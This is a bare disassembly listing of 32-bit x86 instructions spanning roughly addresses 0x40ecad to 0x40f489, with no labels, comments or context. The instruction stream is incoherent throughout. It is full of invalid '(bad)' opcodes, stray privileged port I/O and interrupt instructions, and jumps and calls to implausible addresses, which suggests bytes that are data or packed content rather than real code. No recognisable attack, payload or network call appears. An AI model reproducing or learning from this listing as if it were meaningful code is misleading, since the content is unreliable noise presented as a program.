  40ecad:	cmp    al,0x46
  40ecaf:	shl    eax,0x8
  40ecb2:	(bad)  
  40ecb3:	pop    es
  40ecb4:	fisttp QWORD PTR [ebp+0xe577eff]
  40ecba:	push   ebx
  40ecbb:	add    BYTE PTR [ebx+0x24008b56],cl
  40ecc1:	add    BYTE PTR [ebp+0x50],al
  40ecc4:	push   eax
  40ecc5:	add    DWORD PTR [ebx+0x757d1834],ecx
  40eccb:	sub    edx,DWORD PTR [esi-0x24]
  40ecce:	jne    0x40ec86
  40ecd0:	lods   eax,DWORD PTR ds:[esi]
  40ecd1:	mov    edx,DWORD PTR [edx-0x34]
  40ecd4:	dec    esi
  40ecd5:	out    0x83,eax
  40ecd7:	into   
  40ecd8:	push   edi
  40ecda:	loopne 0x40ecaa
  40ecdc:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40ece0:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ece7:	rol    DWORD PTR [edx],0x8
  40ecea:	mov    esp,ecx
  40ecec:	cmp    DWORD PTR [ebx],0xc
  40ecef:	mov    esi,0x5001c0
  40ecf4:	push   eax
  40ecf5:	push   cs
  40ecf6:	push   eax
  40ecf7:	(bad)  
  40ecf8:	sub    edx,edi
  40ecfa:	push   esi
  40ecfb:	adc    al,0xcb
  40ecfd:	ins    DWORD PTR es:[edi],dx
  40ecfe:	mov    eax,0x203e8
  40ed03:	add    al,ah
  40ed05:	inc    esi
  40ed06:	mov    al,ch
  40ed08:	pop    es
  40ed09:	add    DWORD PTR [eax],0x1
  40ed0c:	add    dh,al
  40ed0e:	add    ah,ch
  40ed10:	rol    DWORD PTR [edx-0xd],1
  40ed13:	cli    
  40ed14:	push   0x4a
  40ed16:	pop    ecx
  40ed17:	retf   0xfe6
  40ed1a:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ed20:	(bad)  
  40ed21:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ed27:	(bad)  
  40ed28:	sub    ebp,DWORD PTR [ebx]
  40ed2a:	and    al,0x52
  40ed2c:	(bad)  
  40ed2d:	dec    edi
  40ed2e:	inc    ebp
  40ed2f:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ed36:	add    BYTE PTR [ebp-0x7b],dh
  40ed39:	pop    eax
  40ed3a:	add    BYTE PTR [edx+0x0],bl
  40ed3d:	pop    edx
  40ed3e:	dec    ebp
  40ed3f:	jmp    DWORD PTR [ebx]
  40ed41:	and    al,0xec
  40ed43:	push   edx
  40ed44:	out    0x64,eax
  40ed46:	jmp    0xd3f2e34b
  40ed4b:	jmp    0x40eda5
  40ed4d:	mov    al,0xfe
  40ed4f:	dec    BYTE PTR [ebp-0x18fd8018]
  40ed55:	add    BYTE PTR [esi+ebp*1],bh
  40ed58:	pop    edx
  40ed59:	icebp  
  40ed5a:	mov    eax,cs
  40ed5c:	ins    BYTE PTR es:[edi],dx
  40ed5d:	adc    eax,0x75510000
  40ed62:	mov    esi,0x70158
  40ed67:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ed6d:	mov    edi,esp
  40ed6f:	cld    
  40ed70:	jge    0x40ede7
  40ed72:	(bad)  
  40ed74:	aas    
  40ed75:	and    al,0x6d
  40ed77:	adc    cl,0x1
  40ed7a:	mov    eax,DWORD PTR [eax]
  40ed7c:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ed82:	dec    ebp
  40ed83:	add    eax,ebp
  40ed85:	add    BYTE PTR [edx],al
  40ed87:	fadd   DWORD PTR [eax]
  40ed89:	stc    
  40ed8a:	enter  0xee00,0x8b
  40ed8e:	sbb    eax,0x1
  40ed91:	sbb    esi,ecx
  40ed93:	in     al,0x0
  40ed95:	in     eax,dx
  40ed96:	add    BYTE PTR [eax],al
  40ed98:	jne    0x40ed25
  40ed9a:	cmp    edx,esp
  40ed9c:	jb     0x40eda7
  40ed9e:	jmp    0x40ee15
  40eda0:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eda6:	add    BYTE PTR [ebx+0x4d83d840],cl
  40edac:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40edb2:	jb     0x40ed3d
  40edb4:	pop    edx
  40edb5:	fadd   QWORD PTR [ebx-0x7445faa1]
  40edbb:	or     dh,BYTE PTR [edx+0x0]
  40edbe:	inc    edx
  40edbf:	or     dl,bh
  40edc1:	xlat   BYTE PTR ds:[ebx]
  40edc2:	dec    edx
  40edc3:	push   edi
  40edc4:	add    al,0x7
  40edc6:	leave  
  40edc7:	rol    DWORD PTR [edx+eax*1],0x7
  40edcb:	add    ecx,ecx
  40edcd:	mov    edx,ecx
  40edcf:	int3   
  40edd0:	jmp    0x40ed90
  40edd2:	mov    al,0x0
  40edd4:	(bad)  
  40edd5:	jne    0x40edbf
  40edd7:	mov    eax,DWORD PTR [edx]
  40edd9:	call   0xc1556ade
  40edde:	pop    edi
  40eddf:	add    ebx,DWORD PTR [ecx-0x37]
  40ede2:	pop    ecx
  40ede3:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40edea:	push   es
  40edeb:	mov    eax,DWORD PTR [eax]
  40eded:	int3   
  40edee:	add    ch,al
  40edf0:	jae    0x40edda
  40edf2:	int    0x1
  40edf4:	enter  0x3000,0x18
  40edf8:	add    BYTE PTR [ebp+0x75],al
  40edfb:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ee01:	push   0x2
  40ee03:	pop    ecx
  40ee04:	add    BYTE PTR [eax],cl
  40ee06:	push   ebx
  40ee07:	lea    edi,[edi+eax*2]
  40ee0a:	mov    al,0x1
  40ee0c:	jb     0x40ee0e
  40ee0e:	mov    al,0x10
  40ee10:	push   eax
  40ee11:	add    al,0x75
  40ee13:	add    BYTE PTR [ebx],ch
  40ee15:	add    ebx,esp
  40ee17:	int3   
  40ee18:	jne    0x40ee2a
  40ee1a:	movsx  edx,cl
  40ee1d:	add    DWORD PTR [eax],eax
  40ee1f:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ee26:	mov    gs,edi
  40ee28:	add    BYTE PTR [eax-0x50],ch
  40ee2b:	add    al,ch
  40ee2d:	mov    eax,DWORD PTR [ecx]
  40ee2f:	sub    eax,DWORD PTR [eax]
  40ee31:	jb     0x40eea8
  40ee33:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ee37:	jge    0x40ee21
  40ee39:	add    al,0x1
  40ee3b:	add    DWORD PTR [eax],0x0
  40ee3e:	jne    0x40ee40
  40ee40:	je     0x40ee87
  40ee42:	mov    eax,DWORD PTR [edi]
  40ee44:	ror    BYTE PTR [ebp+0x4d],1
  40ee47:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ee4e:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ee54:	mov    DWORD PTR [ebx],ebp
  40ee56:	fadd   DWORD PTR [eax+0x75]
  40ee59:	inc    eax
  40ee5a:	pop    eax
  40ee5b:	lea    ebx,[ecx+0x4f]
  40ee5e:	push   0xb1000003
  40ee63:	out    dx,eax
  40ee64:	add    ebp,DWORD PTR [edx+edx*2]
  40ee67:	add    BYTE PTR [ebx+ecx*4],bh
  40ee6a:	mov    ch,BYTE PTR [ebx]
  40ee6c:	jb     0x40eee0
  40ee6e:	add    al,0x89
  40ee70:	push   eax
  40ee71:	call   0x84293be3
  40ee76:	add    DWORD PTR [eax+eax*1],eax
  40ee79:	jae    0x40ee8f
  40ee7b:	icebp  
  40ee7c:	inc    ebp
  40ee7d:	mov    eax,DWORD PTR gs:[ecx]
  40ee80:	int3   
  40ee81:	out    dx,al
  40ee82:	loopne 0x40eed1
  40ee84:	sub    eax,DWORD PTR [edx]
  40ee86:	push   0xffffff83
  40ee88:	pop    esi
  40ee89:	push   cs
  40ee8a:	jl     0x40eea5
  40ee8c:	add    al,0xaf
  40ee8e:	xor    eax,0x832b6d00
  40ee93:	mov    eax,DWORD PTR [edx]
  40ee95:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40ee9b:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40eea1:	inc    ebp
  40eea2:	shr    ebx,0x3
  40eea5:	or     DWORD PTR [eax],0x4
  40eea8:	push   0xffffffa5
  40eeaa:	pop    esi
  40eeab:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40eeb2:	jmp    0x40ef11
  40eeb4:	mov    edi,0xff0272
  40eeb9:	fdivr  QWORD PTR [ebp+0x5d]
  40eebc:	push   0x4e
  40eebe:	pop    ecx
  40eebf:	call   0x4132c4
  40eec4:	mov    DWORD PTR [ebx],eax
  40eec6:	in     al,0xc8
  40eec8:	rol    BYTE PTR [ebp-0x75],0xc1
  40eecc:	call   0xaaf0ad
  40eed1:	pop    esi
  40eed2:	enter  0xceff,0x8b
  40eed6:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eeda:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40eee1:	je     0x40eee3
  40eee3:	or     DWORD PTR [ebx-0x74183b24],eax
  40eee9:	jne    0x40eecf
  40eeeb:	jmp    0x40eee6
  40eeed:	push   DWORD PTR [edx-0x24]
  40eef0:	push   0x4d
  40eef2:	pop    ecx
  40eef3:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40eef7:	jge    0x40eeff
  40eef9:	mov    eax,eax
  40eefb:	sub    ebp,DWORD PTR [edx+0x24]
  40eefe:	pop    esi
  40eeff:	inc    ebp
  40ef00:	mov    esp,0x8b6077
  40ef05:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40ef0b:	lods   al,BYTE PTR ds:[esi]
  40ef0c:	add    BYTE PTR [ebx],bh
  40ef0e:	enter  0xce73,0x49
  40ef12:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40ef1a:	stc    
  40ef1b:	jge    0x40ef8f
  40ef1d:	jnp    0xdd40727e
  40ef23:	call   0xc3eff9
  40ef28:	fadd   st(0),st
  40ef2a:	dec    esi
  40ef2b:	ins    BYTE PTR es:[edi],dx
  40ef2c:	stc    
  40ef2d:	cmp    al,0x73
  40ef2f:	push   ebp
  40ef30:	mov    eax,0xf8028b
  40ef35:	jne    0x40eef8
  40ef37:	mov    esi,ecx
  40ef39:	mov    esp,DWORD PTR [ebp+0x2c]
  40ef3c:	add    edi,DWORD PTR [ebp-0x24]
  40ef3f:	sub    esp,eax
  40ef41:	and    al,0x45
  40ef43:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40ef49:	sbb    al,0xee
  40ef4b:	pop    esi
  40ef4c:	call   0x80ef7c
  40ef51:	fsubr  st,st(3)
  40ef53:	sti    
  40ef54:	add    BYTE PTR gs:[ecx],bh
  40ef57:	add    eax,esp
  40ef59:	add    DWORD PTR [esi],eax
  40ef5b:	rol    DWORD PTR [ebp+0x8],0x29
  40ef5f:	mov    esp,eax
  40ef61:	clc    
  40ef62:	jne    0x40efd9
  40ef64:	mov    eax,0x8b0673
  40ef69:	loopne 0x40efb0
  40ef6b:	loopne 0x40eef6
  40ef6d:	lods   al,BYTE PTR ds:[esi]
  40ef6e:	int3   
  40ef6f:	inc    ebp
  40ef70:	mov    DWORD PTR gs:[eax+edi*8],eax
  40ef74:	add    al,0xc3
  40ef76:	sub    ecx,DWORD PTR [ebp+0x47]
  40ef79:	(bad)  
  40ef7b:	shr    BYTE PTR [ebp-0x1f],0xe8
  40ef7f:	add    eax,DWORD PTR [eax]
  40ef81:	call   0x642b086
  40ef86:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40ef8c:	dec    esi
  40ef8d:	ins    DWORD PTR es:[edi],dx
  40ef8e:	in     al,dx
  40ef8f:	lea    eax,[eax]
  40ef91:	inc    ebp
  40ef92:	inc    ebp
  40ef93:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40ef99:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40efa3:	and    al,0xdc
  40efa5:	ror    DWORD PTR [edx+0x24],0xf7
  40efa9:	or     BYTE PTR [ebp+0x4c],dh
  40efac:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40efb0:	stos   BYTE PTR es:[edi],al
  40efb1:	adc    edx,edi
  40efb3:	inc    esp
  40efb4:	add    edi,DWORD PTR [eax]
  40efb6:	jne    0x40ef9b
  40efb8:	mov    DWORD PTR [eax-0x7449db04],ecx
  40efbe:	cmp    ecx,DWORD PTR [edi]
  40efc0:	sub    BYTE PTR [ebp-0x7e],dl
  40efc3:	sar    ebp,0xb
  40efc6:	jmp    FWORD PTR [edi+0x2400392a]
  40efcc:	sub    esi,DWORD PTR [ebx-0x73]
  40efcf:	mov    esp,DWORD PTR [ecx+edi*4]
  40efd2:	mov    ecx,DWORD PTR [eax]
  40efd4:	and    BYTE PTR [eax],al
  40efd6:	jne    0x40efa2
  40efd8:	sub    ebp,ecx
  40efda:	sbb    BYTE PTR [esi+0x32],ah
  40efdd:	dec    ebp
  40efde:	push   ebp
  40efdf:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40efe5:	ret    
  40efe6:	mov    edx,ebp
  40efe8:	leave  
  40efe9:	sub    DWORD PTR [esi+0x24],ebx
  40efec:	ret    0x2b
  40efef:	pop    ax
  40eff1:	push   ebp
  40eff2:	rol    BYTE PTR [ebx],0xeb
  40eff5:	add    DWORD PTR [ecx+0x6c0001],0x40
  40effc:	jb     0x40f053
  40effe:	ret    
  40efff:	in     al,dx
  40f000:	jecxz  0x40ef8d
  40f002:	push   esi
  40f003:	xchg   esp,eax
  40f004:	jne    0x40f006
  40f006:	cmp    edx,DWORD PTR [esi+0x1c]
  40f009:	jne    0x40efef
  40f00b:	mov    eax,DWORD PTR [ebp-0x77]
  40f00e:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f015:	mov    esi,DWORD PTR [ebp-0x75]
  40f018:	pop    esi
  40f019:	nop
  40f01a:	mov    eax,DWORD PTR [eax]
  40f01c:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f022:	add    al,0x0
  40f024:	inc    ebp
  40f025:	mov    eax,DWORD PTR [ebx]
  40f027:	mov    ebp,ebx
  40f029:	cmp    al,0xf
  40f02b:	or     al,al
  40f02d:	inc    ebp
  40f02e:	inc    ebp
  40f02f:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  40f035:	cld    
  40f036:	add    BYTE PTR [edi+0x546c16c0],dh
  40f03c:	add    BYTE PTR [ecx-0x5],dl
  40f03f:	add    eax,0x17200
  40f044:	sbb    al,0x85
  40f046:	dec    esp
  40f047:	je     0x40f081
  40f049:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f04d:	add    BYTE PTR [ebx],bh
  40f04f:	(bad)  
  40f050:	and    al,0x32
  40f052:	jae    0x40eff0
  40f054:	mov    cl,cl
  40f056:	inc    DWORD PTR [esp]
  40f059:	push   ebp
  40f05a:	shr    esp,0x8
  40f05d:	in     al,dx
  40f05e:	push   esp
  40f05f:	add    DWORD PTR [eax],esp
  40f061:	add    bl,cl
  40f063:	inc    ebp
  40f064:	mov    bh,0x53
  40f066:	add    BYTE PTR [ebp-0x17],al
  40f069:	push   esi
  40f06a:	cmovne ecx,edx
  40f06d:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f071:	push   edi
  40f072:	pop    ss
  40f073:	xor    ecx,ebx
  40f075:	pushf  
  40f076:	add    BYTE PTR [ecx+0x452bf800],cl
  40f07c:	rcr    ecx,0x5
  40f07f:	inc    ebp
  40f080:	add    edx,ebx
  40f082:	add    BYTE PTR [ebp-0x40],al
  40f085:	out    0x6c,eax
  40f087:	inc    ebp
  40f088:	inc    eax
  40f089:	sub    eax,0x450546c1
  40f08e:	dec    esp
  40f08f:	sub    al,0x20
  40f091:	inc    ebp
  40f092:	fnstcw WORD PTR [esi+0x29]
  40f095:	leave  
  40f096:	add    BYTE PTR [esi+0xc000c0],bh
  40f09c:	lea    eax,[esp-0x40]
  40f0a0:	ret    
  40f0a1:	mov    dh,0x8b
  40f0a3:	xor    edx,DWORD PTR [ecx+0x3]
  40f0a6:	mov    al,BYTE PTR [ecx+0x1]
  40f0a9:	sbb    BYTE PTR [eax],al
  40f0ab:	stc    
  40f0ac:	mov    esi,DWORD PTR [edx+0x8]
  40f0af:	(bad)  
  40f0b0:	ss mov eax,0xb98ac631
  40f0b6:	add    esi,eax
  40f0b8:	add    BYTE PTR [edx-0x444d39f7],bh
  40f0be:	add    esi,eax
  40f0c0:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  40f0c7:	mov    BYTE PTR [eax],0xbe
  40f0ca:	or     BYTE PTR [ebx],dh
  40f0cc:	dec    ecx
  40f0cd:	lea    eax,[ebx]
  40f0cf:	or     eax,0x18fc0fc7
  40f0d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d5:	(bad)  
  40f0d7:	fiadd  WORD PTR [ebp-0x78]
  40f0da:	jae    0xed75f829
  40f0e0:	or     BYTE PTR [ebp+0x7],al
  40f0e3:	in     eax,dx
  40f0e4:	fwait
  40f0e5:	inc    ebp
  40f0e6:	xor    ah,dh
  40f0e8:	pop    esi
  40f0e9:	inc    ebp
  40f0ea:	shl    edx,0xc
  40f0ed:	inc    ebp
  40f0ee:	sub    cl,0x1
  40f0f1:	inc    ebp
  40f0f2:	add    bh,bl
  40f0f4:	add    BYTE PTR [ebp-0x7b],al
  40f0f7:	out    dx,al
  40f0f8:	clc    
  40f0f9:	inc    ebp
  40f0fa:	ret    0xe7
  40f0fd:	inc    ebp
  40f0fe:	mov    edi,DWORD PTR [esi-0x7f]
  40f101:	leave  
  40f102:	and    al,0x44
  40f104:	add    BYTE PTR [eax+0x331cb68b],dh
  40f10a:	mov    DWORD PTR [ebx],eax
  40f10c:	sbb    al,0x41
  40f10e:	(bad)  
  40f10f:	sbb    al,ah
  40f111:	stc    
  40f112:	test   DWORD PTR [edx-0x8],esi
  40f115:	lea    edi,[edi-0x7007a98]
  40f11b:	mov    DWORD PTR [ebp-0x2c],edi
  40f11e:	(bad)  
  40f11f:	dec    ebp
  40f120:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  40f127:	add    edx,eax
  40f129:	(bad)  
  40f12a:	(bad)  
  40f12b:	inc    ebx
  40f12d:	jmp    FWORD PTR [edx-0x38]
  40f130:	(bad)  
  40f131:	or     al,ah
  40f133:	jge    0x40f0fb
  40f135:	mov    ebp,0x5a8533e4
  40f13b:	clc    
  40f13c:	enter  0x45,0x8b
  40f140:	lea    ecx,[ebp+ecx*1+0x18330f00]
  40f147:	mov    edi,0x7de08da
  40f14c:	mov    BYTE PTR [ebx+0x39063283],bl
  40f152:	in     eax,dx
  40f153:	cmovne edx,ebx
  40f156:	jmp    0x40f158
  40f158:	inc    ebp
  40f159:	mov    ebp,ebp
  40f15b:	sbb    al,0x45
  40f15d:	mov    ebx,ebx
  40f15f:	add    DWORD PTR [ebp+0x0],eax
  40f162:	in     al,dx
  40f163:	add    DWORD PTR [ebp+0x4d],eax
  40f166:	sub    eax,0x2c80458b
  40f16b:	add    BYTE PTR [ebp-0x77],al
  40f16e:	jle    0x40f1da
  40f170:	leave  
  40f171:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6e6
  40f179:	inc    ebp
  40f17a:	add    ebx,edi
  40f17c:	inc    ecx
  40f17d:	out    0x18,eax
  40f17f:	(bad)  
  40f180:	stc    
  40f181:	int3   
  40f182:	jb     0x40f10e
  40f184:	(bad)  
  40f185:	xor    dh,BYTE PTR [eax-0x4ec73980]
  40f18b:	or     dh,al
  40f18d:	dec    esi
  40f18e:	mov    dl,0xf3
  40f190:	mov    BYTE PTR [ebp-0x4d],0x89
  40f194:	(bad)  
  40f195:	loopne 0x40f14b
  40f197:	inc    esi
  40f199:	lea    esi,[ebp-0x49003924]
  40f19f:	push   eax
  40f1a0:	mov    BYTE PTR [ebp-0x49],0x33
  40f1a4:	xor    eax,DWORD PTR [ebx]
  40f1a6:	lea    edx,[eax+0xd]
  40f1a9:	inc    ebp
  40f1aa:	jae    0x8c1b57c8
  40f1b0:	ficomp WORD PTR [eax+ecx*4]
  40f1b3:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f1ba:	test   esi,edi
  40f1bc:	(bad)  
  40f1bd:	(bad)  
  40f1be:	inc    DWORD PTR [eax]
  40f1c0:	inc    ebp
  40f1c1:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  40f1c7:	test   DWORD PTR [ebx],edx
  40f1c9:	jne    0x40f154
  40f1cb:	or     DWORD PTR [ebx-0xed9771],0x75703b8e
  40f1d5:	jmp    0x124f263
  40f1da:	inc    ebp
  40f1db:	jne    0x40f1c9
  40f1dd:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  40f1e4:	mov    BYTE PTR [ebp+0x45009c01],cl
  40f1ea:	shl    BYTE PTR [eax],0x54
  40f1ed:	push   cx
  40f1ef:	mov    bx,0x7245
  40f1f3:	gs add bh,al
  40f1f6:	add    DWORD PTR [ebp+eax*4+0xe601df],ebx
  40f1fd:	inc    ebp
  40f1fe:	dec    ebp
  40f1ff:	int3   
  40f200:	mov    esp,ebx
  40f202:	jl     0x40f1cb
  40f204:	add    BYTE PTR [ecx+ecx*4+0x1ce28bdb],ah
  40f20b:	inc    ebp
  40f20c:	mov    edi,ebx
  40f20e:	add    ebp,esp
  40f210:	add    BYTE PTR [esi+0x1],ah
  40f213:	inc    ebp
  40f214:	or     BYTE PTR [edi],bh
  40f216:	inc    ebp
  40f217:	(bad)  
  40f218:	in     eax,dx
  40f219:	fsubr  st(2),st
  40f21b:	inc    edi
  40f21d:	add    dl,al
  40f21f:	add    dh,ch
  40f221:	call   0x860aa4
  40f226:	pop    esi
  40f227:	test   DWORD PTR [eax],ecx
  40f229:	dec    dl
  40f22b:	(bad)  
  40f22c:	jmp    0x413f7ab6
  40f231:	push   DWORD PTR [ebp-0x75]
  40f234:	(bad)  
  40f235:	loopne 0x40f203
  40f237:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  40f241:	push   eax
  40f242:	inc    DWORD PTR [ebp-0x75]
  40f245:	mov    esp,eax
  40f247:	cwde   
  40f248:	mov    DWORD PTR [eax],0xff8bffc3
  40f24e:	sbb    al,0x8
  40f250:	ror    BYTE PTR [ebp+0x50],0x51
  40f254:	inc    ebp
  40f255:	ror    BYTE PTR [ebx+0x65987d],1
  40f25b:	test   edi,eax
  40f25d:	add    al,0xdc
  40f25f:	add    bh,bh
  40f261:	push   0x1
  40f263:	add    BYTE PTR [eax],al
  40f265:	mov    edi,edi
  40f267:	inc    WORD PTR [ebp+0x8]
  40f26b:	add    eax,0xd
  40f26e:	(bad)  
  40f270:	xor    eax,0x782ec89
  40f275:	push   ecx
  40f276:	cli    
  40f277:	popw   es
  40f279:	push   ebp
  40f27a:	xchg   BYTE PTR [ebx-0x76740800],al
  40f280:	sbb    al,0x86
  40f282:	test   DWORD PTR [ecx-0x2],edx
  40f285:	call   WORD PTR [ebp-0x40]
  40f289:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  40f28d:	mov    eax,ebx
  40f28f:	mov    dh,BYTE PTR ds:0xc7666851
  40f295:	push   ebp
  40f296:	fsub   QWORD PTR [esi+0x0]
  40f299:	dec    ebp
  40f29a:	inc    ebp
  40f29b:	mov    edx,0xea4ece
  40f2a0:	(bad)  
  40f2a1:	retf   0x89a0
  40f2a4:	fist   DWORD PTR [eax+0x454ae1]
  40f2aa:	call   0xc7a72f3a
  40f2af:	mov    ch,0xa8
  40f2b1:	jmp    eax
  40f2b3:	(bad)  
  40f2b4:	in     eax,dx
  40f2b5:	lock (bad) 
  40f2b7:	mov    DWORD PTR [esi+ebp*2-0x727a0082],ebp
  40f2be:	(bad)  
  40f2bf:	xor    eax,0x700089ff
  40f2c4:	add    bh,bh
  40f2c6:	stos   DWORD PTR es:[edi],eax
  40f2c7:	data16 add BYTE PTR [ebp-0x1b0077],al
  40f2ce:	inc    DWORD PTR [ecx-0x73]
  40f2d1:	data16 fadd QWORD PTR [ebp-0xaf0001]
  40f2d8:	inc    ebp
  40f2d9:	shl    BYTE PTR [ebx],0x66
  40f2dc:	add    eax,DWORD PTR [ebp-0xba00b0]
  40f2e2:	add    DWORD PTR [ecx+0x44],0x66
  40f2e6:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  40f2ec:	add    DWORD PTR [ecx-0xcf8600],ecx
  40f2f2:	push   ebp
  40f2f3:	lea    dx,[ebp-0x28]
  40f2fa:	add    BYTE PTR [ebp-0x25],0xf
  40f2fe:	jge    0xff41f205
  40f304:	mov    ecx,0xc34fc7
  40f309:	rol    ecx,0x89
  40f30c:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  40f310:	ror    BYTE PTR [ebx-0x48990775],0x55
  40f317:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  40f31e:	test   BYTE PTR [ecx-0x3f997f3e],cl
  40f324:	push   ebp
  40f325:	mov    DWORD PTR [ebp-0x76761880],ecx
  40f32b:	or     BYTE PTR [eax+0x6600c265],0x45
  40f332:	push   ebp
  40f333:	xor    DWORD PTR [ebp-0x76381e64],ecx
  40f339:	aam    0x8c
  40f33b:	test   DWORD PTR [ecx-0x3dba7108],ecx
  40f341:	cmp    eax,0xc78b9c00
  40f346:	data16 hlt 
  40f348:	dec    ebp
  40f349:	test   DWORD PTR [ecx+0x454ff8],edi
  40f34f:	xor    ecx,esi
  40f351:	lahf   
  40f352:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  40f358:	mov    eax,DWORD PTR [ecx]
  40f35a:	data16 add BYTE PTR [ebp-0x7400bb],dh
  40f361:	sbb    al,0x71
  40f363:	dec    ebp
  40f364:	mov    si,WORD PTR [ebp-0xff0074]
  40f36b:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  40f371:	add    BYTE PTR [ebp-0x760fd877],cl
  40f377:	jne    0x40f3ed
  40f379:	test   edi,edi
  40f37b:	jne    0x40f300
  40f37d:	(bad)  
  40f37e:	sti    
  40f37f:	sbb    BYTE PTR [ecx-0x1789ab],cl
  40f385:	cld    
  40f386:	(bad)  
  40f387:	jmp    DWORD PTR [ecx]
  40f389:	inc    ebp
  40f38a:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  40f390:	data16 cmp al,0x8d
  40f393:	push   cs
  40f394:	inc    DWORD PTR [ebp-0x1]
  40f397:	test   DWORD PTR [ecx-0x838c],ecx
  40f39d:	sbb    al,0x8b
  40f39f:	lock clc 
  40f3a1:	push   DWORD PTR [edi-0xe39375]
  40f3a7:	xor    BYTE PTR [ebx],0x1
  40f3aa:	add    eax,DWORD PTR [eax]
  40f3ac:	xor    eax,DWORD PTR [eax]
  40f3ae:	mov    WORD PTR [ebp-0xba003d],0x4575
  40f3b7:	mov    ecx,DWORD PTR [edi]
  40f3b9:	sbb    al,0x4d
  40f3bb:	mov    DWORD PTR [ebx],esi
  40f3bd:	add    DWORD PTR [ebx],eax
  40f3bf:	add    BYTE PTR [ebx],dh
  40f3c1:	xor    DWORD PTR [esi-0x80],esp
  40f3c4:	inc    ebp
  40f3c5:	add    DWORD PTR [ebx],esi
  40f3c7:	add    BYTE PTR [esi+0x50],ah
  40f3ca:	inc    ebp
  40f3cb:	jmp    0x85f636
  40f3d0:	add    DWORD PTR [eax+0xc70194],0xffffffec
  40f3d7:	or     BYTE PTR [ebp+0x4501f845],dh
  40f3dd:	jmp    0xdcf6d3
  40f3e2:	(bad)  
  40f3e3:	push   cs
  40f3e4:	in     al,0xc9
  40f3e6:	test   DWORD PTR [ebp+0x4502f8],eax
  40f3ec:	xor    ecx,DWORD PTR [ebp-0x64]
  40f3ef:	mov    eax,edi
  40f3f1:	mov    esp,esp
  40f3f3:	push   eax
  40f3f4:	add    eax,0x45fff885
  40f3f9:	dec    DWORD PTR [ebx+0x339445]
  40f3ff:	add    ecx,DWORD PTR [ecx+0x452ce889]
  40f405:	dec    DWORD PTR [ebx-0x4e0be375]
  40f40b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f40c:	add    edi,edi
  40f40e:	add    bh,bh
  40f410:	push   cs
  40f411:	xor    eax,DWORD PTR [eax+0x890103]
  40f417:	xor    BYTE PTR [ebp-0x1],al
  40f41a:	mov    DWORD PTR [ebp-0x36df38],ecx
  40f420:	push   cs
  40f421:	push   eax
  40f422:	jne    0x40f469
  40f424:	mov    esi,DWORD PTR [ebx]
  40f426:	sbb    al,0x3
  40f428:	jne    0x40f47a
  40f42a:	inc    DWORD PTR [ebp-0x75]
  40f42d:	add    eax,0x800f0
  40f432:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  40f438:	mov    DWORD PTR [ecx],eax
  40f43a:	sbb    BYTE PTR [eax],al
  40f43c:	leave  
  40f43d:	test   DWORD PTR [edi-0x1],eax
  40f440:	jne    0x40f441
  40f442:	call   0xff41df47
  40f447:	xor    BYTE PTR [ebp+0x4d],al
  40f44a:	mov    edi,edi
  40f44c:	enter  0x8,0x4d
  40f450:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  40f456:	mov    eax,DWORD PTR [eax]
  40f458:	sbb    al,0x1
  40f45a:	sbb    DWORD PTR [ebp+0x4d],eax
  40f45d:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  40f463:	inc    eax
  40f464:	dec    DWORD PTR [ecx-0x27d775]
  40f46a:	add    BYTE PTR [ebx-0x38d72b01],cl
  40f470:	xchg   ecx,eax
  40f471:	ret    
  40f472:	add    BYTE PTR [ebp-0x830075],al
  40f478:	add    BYTE PTR [ebp-0x75],al
  40f47b:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  40f481:	lea    edi,[edi+0x20]
  40f484:	add    bh,bh
  40f486:	mov    edx,DWORD PTR [eax-0x7b]
  40f489:	inc    ebp
